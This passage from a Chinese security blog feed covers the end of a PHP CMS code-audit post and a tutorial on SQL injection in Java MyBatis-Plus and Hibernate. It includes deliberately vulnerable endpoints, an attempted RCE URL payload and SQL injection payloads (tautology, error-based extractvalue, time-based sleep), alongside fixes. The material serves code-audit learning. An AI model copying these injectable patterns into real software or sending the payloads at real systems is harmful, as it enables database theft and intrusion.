&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此代码大致作用：</p><ol><li>获取请求参数 <code>a</code> 来确定控制器；</li><li>若请求的是后台控制器，且用户未登录，则重定向到登录页面；</li><li>若控制器类文件不存在，则默认使用 <code>LoginAction</code>；</li><li>创建控制器类的对象，并返回</li></ol><p>所以无法调用传入的控制器内不存在的方法</p><p>存在eval函数的方法是run方法，像另一个成功执行的rce漏洞一样构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/yccms/admin/?a=action&amp;m=run();phpinfo();//../#<br></code></pre></td></tr></table></figure><p>仍然无法注入成功</p><p>可以看到在步入run.inc.php后，m的值变为main</p><h5 id="文件包含-run-inc-php-误报"><a href="#文件包含-run-inc-php-误报" class="headerlink" title="文件包含(run.inc.php)误报"></a>文件包含(run.inc.php)误报</h5><p>工具审计时发现了require关键字，可能存在文件包含漏洞</p><p>但是require函数内无可控变量，无法利用此函数</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li><p>自动化工具一般是直接搜索关键字或敏感函数，误报很多</p></li><li><p>找漏洞关键要看漏洞点和利用点，有入口能利用才算漏洞</p></li><li><p>寻找敏感函数和可控变量，查看变量有无过滤，过滤是否可绕过</p></li><li><p>cms漏洞：</p><ul><li>鉴权处理不到位，大部分操作都没有鉴权，无需登录就可操作</li></ul><p>​       修复建议：写出单独的鉴权文件，在每个类中引用</p><ul><li>过滤不严格，对文件名及文件路径几乎无过滤</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的sql注入2.0</title>
    <link href="/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/"/>
    <url>/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计中的sql注入2-0"><a href="#Java代码审计中的sql注入2-0" class="headerlink" title="Java代码审计中的sql注入2.0"></a>Java代码审计中的sql注入2.0</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%80%BB%E7%BB%93-JDBC-%E6%98%93%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%82%B9">Java OWASP 中的 SQL 注入代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p><a href="https://xz.aliyun.com/news/11118">JAVA常用框架SQL注入审计-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_38170796/article/details/135398819">预编译真的能完美防御SQL注入吗？_预编译能完全防止sql注入吗-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_63299495/article/details/145633163">【MyBatis】预编译SQL与即时SQL_mybatis sql预处理-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_45537947/article/details/111399311">MyBatis-Plus快速入门-(干货满满+超详细)_mybatis-plus 入门-CSDN博客</a></p><h2 id="Mybatis-Plus-的-SQL-注入探讨"><a href="#Mybatis-Plus-的-SQL-注入探讨" class="headerlink" title="Mybatis-Plus 的 SQL 注入探讨"></a>Mybatis-Plus 的 SQL 注入探讨</h2><h3 id="使用apply直接拼接sql语句"><a href="#使用apply直接拼接sql语句" class="headerlink" title="使用apply直接拼接sql语句"></a>使用apply直接拼接sql语句</h3><h4 id="实际的apply场景"><a href="#实际的apply场景" class="headerlink" title="实际的apply场景"></a>实际的apply场景</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 将此方法绑定到 HTTP 请求路径 /mybatis_plus/mpVuln01</span><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln01&quot;)</span>  <br><span class="hljs-comment">// 定义一个控制器方法，接收两个参数 name 和 id，并返回一个 Employee 对象</span><br><span class="hljs-keyword">public</span> Employee <span class="hljs-title function_">mpVuln01</span><span class="hljs-params">(String name, String id)</span> &#123;  <br>    <span class="hljs-comment">// 创建一个查询条件构造器</span><br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br>    <span class="hljs-comment">// 添加等值查询条件：WHERE name = #&#123;name&#125;</span><br>    wrapper.eq(<span class="hljs-string">&quot;name&quot;</span>, name);  <br>    <span class="hljs-comment">// 直接拼接 SQL 片段，变成：AND id=xxx（存在 SQL 注入风险）</span><br>    wrapper.apply(<span class="hljs-string">&quot;id=&quot;</span> + id);  <br>    <span class="hljs-comment">// 执行查询，只返回一条符合条件的记录</span><br>    <span class="hljs-type">Employee</span> <span class="hljs-variable">employee</span> <span class="hljs-operator">=</span> employeeMapper.selectOne(wrapper);  <br>    <span class="hljs-comment">// 返回查询结果</span><br>    <span class="hljs-keyword">return</span> employee;  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接看到这里的参数传入是直接拼接的，存在sql注入漏洞</p><p>但是由于selectOne函数的存在(只返回一条符合条件的记录)，这里只能进行报错注入，万能密码会返回全部数据，由于特殊函数限制，无法注入成功</p><h4 id="apply场景的防护"><a href="#apply场景的防护" class="headerlink" title="apply场景的防护"></a>apply场景的防护</h4><p>在语句后加上参数占位符{0}即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpSec02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpSec02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.apply(<span class="hljs-string">&quot;id=&#123;0&#125;&quot;</span>,id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="last方法产生的sql注入"><a href="#last方法产生的sql注入" class="headerlink" title="last方法产生的sql注入"></a>last方法产生的sql注入</h3><p>last()方法重写后有两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">last(String lastSql)<br>last(<span class="hljs-type">boolean</span> condition, String lastSql)<br></code></pre></td></tr></table></figure><p>此方法中lastSql可以直接用来编写SQL语句，写一个新接口</p><p>猜测实战黑盒利用场景为在线sql语句执行程序，可以编写新接口进行渗透</p><p>这里直接使用Drunkbaby师傅的漏洞环境</p><p>项目地址：[JavaSecurityLearning&#x2F;JavaSecurity&#x2F;Java 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)](<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java</a> 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/last&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln03</span><span class="hljs-params">( String id)</span> &#123;<br>        QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();<br>        wrapper.last(<span class="hljs-string">&quot;order by &quot;</span> + id);<br>        <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);<br>    &#125;<br></code></pre></td></tr></table></figure><p>启动环境时出现报错</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A501.png" alt="图片"></p><p>在MybatisPluSqliApplication.java文件加上一行代码即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br></code></pre></td></tr></table></figure><p>文件全部</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby;<br><br><span class="hljs-keyword">import</span> org.mybatis.spring.annotation.MapperScan;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPluSqliApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MybatisPluSqliApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实操后发现不需要payload也是直接爆出所有数据的</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A502.png" alt="图片"></p><p>可能是我的操作出了什么问题，但是本来控制代码就不是很多，感觉应该是没有问题的</p><p>正常payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8081/mybatis_plus/last?id=1%20or%201=1<br></code></pre></td></tr></table></figure><h4 id="order-by相关的sql注入"><a href="#order-by相关的sql注入" class="headerlink" title="order by相关的sql注入"></a>order by相关的sql注入</h4><p>刚开始想要搭这个环境的主要原因是没见过order by后拼接万能密码的</p><p>再次复习了一下order by相关</p><p>在 SQL 中，<code>ORDER BY</code> 子句用于对查询结果进行排序。<code>ORDER BY</code> 后的参数有以下要求和注意事项：</p><ol><li>列名或别名</li></ol><ul><li><p>可以使用表中的列名或查询中定义的列别名。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age;<br></code></pre></td></tr></table></figure></li></ul><ol start="2"><li>列的序号(sql注入中常用于判断列数)</li></ol><ul><li><p>可以使用 SELECT 子句中列的序号（从 1 开始）。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>; <span class="hljs-comment">-- 按第二列 age 排序</span><br></code></pre></td></tr></table></figure></li></ul><ol start="3"><li>排序方式</li></ol><ul><li><p>默认是升序（<code>ASC</code>），也可以显式指定。</p></li><li><p>降序使用 <code>DESC</code>。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p> 4.多个排序条件</p></li><li><p>可以指定多个列，按优先级依次排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age, grade <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>, age <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li>表达式或计算结果</li></ol><ul><li><p>可以使用表达式或计算结果进行排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, salary, bonus <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (salary <span class="hljs-operator">+</span> bonus) <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="6"><li>NULL 值排序</li></ol><ul><li><p>不同数据库对 </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p> 的排序处理可能不同：</p><ul><li>一般情况下，<code>NULL</code> 在升序中排在最前，在降序中排在最后。</li><li>可以使用 <code>NULLS FIRST</code> 或 <code>NULLS LAST</code> 明确指定。</li></ul></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">ASC</span> <span class="hljs-keyword">NULLS LAST</span>;<br></code></pre></td></tr></table></figure></li></ul><p>注意事项：</p><ul><li>列必须存在：<code>ORDER BY</code> 中引用的列或别名必须在查询结果中有效。</li><li>性能影响：排序操作可能会影响查询性能，尤其是大数据集时。</li></ul><p>并且order by语句后无法拼接变量，但是可以拼接sql语句，如果万能密码能够使用，猜测是被当作sql语句执行</p><h3 id="exists-notExists-拼接产生的SQL-注入"><a href="#exists-notExists-拼接产生的SQL-注入" class="headerlink" title="exists&#x2F;notExists 拼接产生的SQL 注入"></a>exists&#x2F;notExists 拼接产生的SQL 注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln04&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln04</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.exists(<span class="hljs-string">&quot;select * from employees where id = &quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="having-语句"><a href="#having-语句" class="headerlink" title="having 语句"></a>having 语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln06&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln06</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().groupBy(<span class="hljs-string">&quot;id&quot;</span>).having(<span class="hljs-string">&quot;id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解"><a href="#order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解" class="headerlink" title="order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)"></a>order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)</h3><p>相关接口写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby01</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderBy(<span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByAsc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby03&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby03</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByDesc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="group-By-order-by"><a href="#group-By-order-by" class="headerlink" title="group By&#x2F;order by"></a>group By&#x2F;order by</h3><h3 id="inSql-notInSql"><a href="#inSql-notInSql" class="headerlink" title="inSql&#x2F;notInSql"></a>inSql&#x2F;notInSql</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/insql&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">inSql</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().inSql(id, <span class="hljs-string">&quot;select * from employees where id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><p>这几种方法都是不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><h3 id="分页插件的-SQL-注入情况"><a href="#分页插件的-SQL-注入情况" class="headerlink" title="分页插件的 SQL 注入情况"></a>分页插件的 SQL 注入情况</h3><h4 id="分页插件自带的-addOrder-方法"><a href="#分页插件自带的-addOrder-方法" class="headerlink" title="分页插件自带的 addOrder() 方法"></a>分页插件自带的 <code>addOrder()</code> 方法</h4><ul><li><p>配置分页插件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby.config;  <br>  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;  <br>  <br><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * 注册插件  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-meta">@Bean</span>  <br> <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;  <br>  <br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();  <br> <span class="hljs-comment">// 添加分页插件  </span><br> <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">pageInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();  <br> <span class="hljs-comment">// 设置请求的页面大于最大页后操作，true调回到首页，false继续请求。默认false  </span><br> pageInterceptor.setOverflow(<span class="hljs-literal">false</span>);  <br> <span class="hljs-comment">// 单页分页条数限制，默认无限制  </span><br> pageInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);  <br> <span class="hljs-comment">// 设置数据库类型  </span><br> pageInterceptor.setDbType(DbType.MYSQL);  <br>  <br> interceptor.addInnerInterceptor(pageInterceptor);  <br> <span class="hljs-keyword">return</span> interceptor;  <br> &#125;    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>漏洞接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/PageVul01&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title function_">mybatisPlusPageVuln01</span><span class="hljs-params">(Long page, Long size, String id)</span>&#123;  <br>    QueryWrapper&lt;Person&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> Page&lt;Person&gt; personPage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);  <br> personPage.addOrder(OrderItem.asc(id));  <br> IPage&lt;Person&gt; iPage= personMapper.selectPage(personPage, queryWrapper);  <br> List&lt;Person&gt; people = iPage.getRecords();  <br> <span class="hljs-keyword">return</span> people;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>Page&lt;Person&gt; personPage = new Page&lt;&gt;(1,2);</code> 的参数由自己定义</p><p>这里对应的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e)))<br><br>// 或者是<br>?id=1&#x27; and sleep(5)<br></code></pre></td></tr></table></figure><p>必须是通过盲注的形式，如果是普通的注入，是不会有回显的；因为这里分页查找，size 就把你的数据数量限定死了，如果超过这个数据就会报错，所以只能盲注。</p></li></ul><h4 id="pagehelper"><a href="#pagehelper" class="headerlink" title="pagehelper"></a>pagehelper</h4><p>这里的原理就和 order by 一样，不赘述了</p><p>因为Order by排序时不能进行预编译处理，所以在使用插件时需要额外注意如下function，同样会存在SQL注入风险：</p><ul><li>com.github.pagehelper.Page<ul><li>主要是setOrderBy(java.lang.String)方法</li></ul></li><li>com.github.pagehelper.page.PageMethod<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li><li>com.github.pagehelper.PageHelper<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li></ul><h2 id="mybatis-Plus-SQL-注入的修复"><a href="#mybatis-Plus-SQL-注入的修复" class="headerlink" title="mybatis Plus SQL 注入的修复"></a>mybatis Plus SQL 注入的修复</h2><p>以上列出的所有方法，除了apply方法可以使用参数占位符进行防护，其他方法全部不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><p>能想到的防护方法只有对传入的参数进行检测和过滤</p><p>还有写Filter进行过滤</p><p>过滤器集成：<a href="https://github.com/Drun1baby/AWD-AWDP_SecFilters">Drun1baby&#x2F;AWD-AWDP_SecFilters: 为了准备 AWD，写了个 Filter 的集合 (github.com)</a></p><h2 id="Hibernate框架下的SQL注入"><a href="#Hibernate框架下的SQL注入" class="headerlink" title="Hibernate框架下的SQL注入"></a>Hibernate框架下的SQL注入</h2><p> Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。</p><p>一般是默认进行预编译的</p><p>Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入</p><h3 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h3><p>hql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hql">String hql = &quot;from People where username = &#x27;&quot; + username + &quot;&#x27; and password = &#x27;&quot; + password + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>这种拼接方式存在SQL注入</p><p>正确使用以下几种HQL参数绑定的方式可以有效避免注入的产生：</p><p>1.命名参数（named parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = 